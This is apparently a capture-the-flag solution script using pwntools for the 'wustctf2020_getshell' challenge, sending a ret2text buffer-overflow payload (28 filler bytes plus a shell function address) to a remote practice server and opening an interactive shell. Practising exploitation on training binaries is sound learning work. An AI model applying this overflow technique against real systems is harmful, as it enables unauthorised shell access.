#Made by fly_autumn
#x86 ret2text...
from pwn import *
#p = process("./wustctf2020_getshell")
p = remote("node5.buuoj.cn",28015)
elf = ELF("./wustctf2020_getshell")
context(os="linux",arch="i386")

shell_plt = 0x804851b
payload = b"\x00" * 28 + p32(shell_plt)
p.sendline(payload)

p.interactive()
